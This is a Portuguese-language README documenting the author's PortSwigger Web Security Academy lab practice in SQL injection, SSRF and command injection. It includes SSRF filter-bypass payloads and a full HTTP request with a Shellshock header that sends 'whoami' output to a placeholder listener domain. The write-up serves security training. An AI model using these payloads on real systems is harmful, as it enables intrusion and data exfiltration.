
---

# 🔒 Web Security Labs – PortSwigger Red Team Practice

[![Progress](https://img.shields.io/badge/Progress-75%25-brightgreen?style=flat-square)](https://github.com/wkkwkwjwjjKk/Web-Security-Labs-PortSwigger-Red-Team-Practice)
[![Labs](https://img.shields.io/badge/Labs-15%2F20-blue?style=flat-square)](https://github.com/wkkwkwjwjjKk/Web-Security-Labs-PortSwigger-Red-Team-Practice)
[![Status](https://img.shields.io/badge/Status-Active-green?style=flat-square)](https://github.com/wkkwkwjwjjKk/Web-Security-Labs-PortSwigger-Red-Team-Practice)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](./LICENSE)

Documentação completa de **laboratórios práticos** de segurança ofensiva web, com foco em exploração manual, análise de vulnerabilidades e desenvolvimento de raciocínio de ataque.

> **Nível**: Intermediário → Avançado | **Plataforma**: PortSwigger Web Security Academy | **Idioma**: Português (PT‑BR)

---

## 📊 Status Geral do Repositório

```
████████████░░░░░░░░░░ 75% Completo (15/20 laboratórios documentados)
```

| Status | Quantidade | Percentual |
|--------|-----------|-----------|
| ✅ **Concluído** | 14 | 70% |
| 🟡 **Metodologia Dominada / Em Estudo** | 1 | 5% |
| 🔴 **Não Iniciado** | 5 | 25% |

---

## 🚀 Comece Rápido

### Por Nível de Conhecimento

**🟢 Iniciante**
```
1. Autenticação e controle de acesso
2. SQL Injection básica
3. Conceitos fundamentais de requisições HTTP
```
**Tempo estimado**: ~4 horas

**🟠 Intermediário**
```
1. Injeções avançadas: SQLi cega, SSRF, Command Injection
2. Manipulação de cabeçalhos, parâmetros e URLs
3. Técnicas OAST para detecção e extração sem retorno visível
```
**Tempo estimado**: ~15 horas

**🔴 Avançado**
```
1. XXE, SSTI e Desserialização Insegura
2. Análise e exploração de falhas em lógica de negócio
3. Testes e segurança em APIs
```
**Tempo estimado**: ~20 horas

---

## 🎓 Categorias e Laboratórios

### 🟢 Autenticação e Controle de Acesso
✅ **Status**: 100% concluído
- Enumeração de usuários e contas
- Bypass de limites de tentativas e bloqueios
- Contornos em fluxos de autenticação de dois fatores (2FA)
- Vulnerabilidades em OAuth e OpenID Connect
- Escalonamento de privilégios e falhas de referência de objeto direto (IDOR)

---

### 🟡 Injeção de Código e Comandos

#### 📌 SQL Injection
✅ **Status**: 9/9 laboratórios concluídos
- Injeção simples com uso de `UNION` para extração de dados
- Enumeração de esquemas, tabelas e colunas do banco
- SQLi cega por condição booleana e por atraso no tempo de resposta
- Bypass de filtros, validações e sistemas de proteção (WAF)
- Injeção em formatos não convencionais: XML e JSON

#### 📌 SSRF – Server‑Side Request Forgery
🟡 **Status**: 7/7 laboratórios trabalhados — conceitos e metodologia 100% dominados

**Conceito**: Vulnerabilidade que permite ao atacante manipular requisições feitas pela própria aplicação, fazendo com que o servidor envie solicitações arbitrárias para destinos internos ou externos. Isso possibilita acessar recursos, serviços e sistemas que não seriam diretamente visíveis ou acessíveis a partir da internet pública.

**Laboratórios trabalhados**:
1. **Basic SSRF against the local server** ✅
   - Manipulação do parâmetro ou URL alvo
   - Redirecionamento da requisição para `http://localhost` ou `127.0.0.1`
   - **Objetivo**: Acessar interfaces administrativas e serviços restritos que só aceitam conexões vindas do próprio servidor

2. **Basic SSRF against another back‑end system** ✅
   - Alteração do destino para endereços da rede interna, na faixa `192.168.0.0/24`
   - **Resultado**: Comunicação com máquinas de apoio e servidores internos sem acesso público
   - **Aprendizado**: O SSRF funciona como uma "ponte" entre a internet e a infraestrutura interna da aplicação

3. **SSRF with blacklist‑based input filter** ✅
   - **Desafio**: A aplicação bloqueava termos como `localhost`, `127.0.0.1` e intervalos de IP privados
   - **Técnicas de contorno**:
     - Representações alternativas de IP: `2130706433`, `0177.0.0.1`, `0x7f.0.0.1`
     - Uso de domínios que resolvem para o endereço local
     - Inserção de caracteres extras e codificação parcial
   - **Resultado**: Acesso bem‑sucedido mesmo com filtro de bloqueio ativo

4. **SSRF with filter bypass via open redirection** ✅
   - **Desafio**: A aplicação só permitia requisições para o próprio domínio
   - **Estratégia**: Combinação com falha de redirecionamento aberto existente
   - **Payload exemplo**: `/redirect?url=http://127.0.0.1/admin`
   - **Resultado**: O validador aceitou o caminho interno, enquanto o redirecionamento levou a requisição ao destino desejado

5. **Blind SSRF with out‑of‑band detection** ✅ *Resolvido*
   - **Cenário**: Não havia retorno do conteúdo ou mensagens visíveis na resposta
   - **Técnica**: Detecção via canal fora de banda (OAST)
   - **Vetor**: Cabeçalho HTTP `Referer`
   - **Ferramenta**: Interactsh — alternativa gratuita ao Burp Collaborator
   - **Resultado**: Confirmação da vulnerabilidade por meio de consultas DNS e requisições HTTP registradas no servidor de escuta

6. **SSRF with whitelist‑based input filter** ✅ *Resolvido*
   - **Desafio**: A aplicação só aceitava URLs contendo o domínio `stock.weliketoshop.net`
   - **Problema explorado**: Diferença de interpretação entre o sistema de validação e o cliente HTTP que executa a requisição
   - **Técnicas aplicadas**:
     - Uso do caractere `@`: tudo antes é ignorado como credencial fictícia
     - Uso do caractere `#`: define um fragmento que não é enviado na requisição final
     - Codificação dupla para enganar rotinas de filtro
   - **Payload final**: `http://stock.weliketoshop.net%2523@127.0.0.1/admin`
   - **Resultado**: Validação aprovada e requisição executada para o servidor local

7. **Blind SSRF with Shellshock exploitation** 🟡 *Metodologia e fluxo de ataque compreendidos*
   - **Objetivo**: Usar o SSRF para acessar um servidor interno vulnerável e transformar o acesso em execução remota de comandos, extraindo dados do sistema
   - **Fluxo compreendido**:
     1. **Vetor SSRF**: Cabeçalho `Referer` para apontar para o alvo interno `192.168.0.141:8080`
     2. **Vetor Shellshock**: Servidores com versões antigas do Bash interpretam cabeçalhos como variáveis de ambiente. Formato da injeção:
        ```
        () { :; }; COMANDO_A_SER_EXECUTADO
        ```
     3. **Detecção**: Uso de técnica OAST para enviar o resultado do comando `whoami` para um servidor externo controlado
   - **Requisição pronta**:
     ```http
     GET /product?productId=4 HTTP/2
     Host: 0af30028034805ef825e2e92001900e9.web-security-academy.net
     Cookie: session=pM7PPdH5yPalXS9lk12BFVpDpLq1fDpo
     Referer: http://192.168.0.141:8080
     User-Agent: () { :; }; /usr/bin/nslookup $(whoami).seu-servidor-de-escuta.com
     ```
   - **Limitações encontradas**: A plataforma PortSwigger bloqueia comunicação com servidores genéricos, permitindo apenas o Burp Collaborator. Ferramentas gratuitas como o Interactsh foram bloqueadas, impedindo a visualização da interação
   - **Conclusão**: Todo o fluxo e lógica de ataque estão dominados. Em ambientes sem restrições ou com as ferramentas adequadas, a exploração é totalmente funcional

**✅ Aprendizados da categoria**:
- Listas de permissão não são mais seguras que listas de bloqueio — dependem de interpretação consistente em todas as etapas
- É possível **encadear vulnerabilidades**: de um SSRF simples até a execução remota de comandos
- Cabeçalhos e parâmetros aparentemente inofensivos podem ser usados como vetores de ataque
- Técnicas OAST são fundamentais para confirmar falhas quando não há retorno visível
- Restrições de rede podem limitar a execução, mas não invalidam a lógica do ataque

---

#### 📌 Command Injection
✅ **Status**: 100% concluído

**Conceito**: Ocorre quando a aplicação repassa entrada do usuário diretamente ao interpretador de comandos do sistema operacional, sem sanitização ou validação adequada, permitindo execução arbitrária de instruções.

**Laboratórios resolvidos**:
1. **Basic Command Injection**
   - Inserção de separadores como `;`, `&`, `|`, `&&` para encadear comandos
   - Confirmação imediata através da saída retornada na resposta

2. **Blind OS Command Injection with Time Delays**
   - Detecção por alteração no tempo de resposta usando o comando `sleep`

3. **Blind OS Command Injection with Out‑of‑Band Exfiltration**
   - Cenário sem retorno visível
   - **Técnica**: O comando injetado força o servidor a fazer uma requisição para um domínio controlado
   - **Resultado**: A interação recebida confirma a execução mesmo sem evidências na tela

**Principais aprendizados**:
- Falta de retorno visível não significa ausência de vulnerabilidade
- Técnicas OAST permitem confirmar e extrair dados de forma silenciosa
- Entradas que parecem inofensivas podem comprometer todo o sistema operacional

---

### 🟢 Manipulação de Requisições e Fluxos
✅ **Status**: 100% concluído
- CSRF básico e com contorno de validações
- Poluição de parâmetros e atribuição em massa (*mass assignment*)
- Vulnerabilidades em tokens JWT e mecanismos de sessão

---

### 🔴 Tópicos a Iniciar
- **XXE Injection**: Exploração de processamento inseguro de arquivos XML
- **SSTI**: Injeção em mecanismos de renderização de templates
- **Desserialização Insegura**: Manipulação de objetos serializados
- Falhas em lógica de negócio e regras de funcionamento da aplicação
- Vulnerabilidades específicas em APIs REST e GraphQL

---

## 🛠️ Ferramentas Utilizadas
- **Burp Suite Community Edition**: Proxy, interceptação, análise e envio de requisições
- **Interactsh**: Serviço OAST gratuito para detecção e extração de dados em ataques cegos
- **Ferramentas do navegador**: Depurador, inspetor de elementos e análise de rede
- **Utilitários de linha de comando**: `curl`, `nslookup`, `ping`

---

## 📚 Referências
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [HackTricks](https://book.hacktricks.xyz/)

---

## ⚠️ Aviso Legal
Todos os testes e análises foram realizados **exclusivamente em ambientes autorizados e controlados**, para fins de estudo e pesquisa em segurança da informação. Não utilize as técnicas descritas em sistemas ou aplicações que você não possua permissão explícita para testar.

---
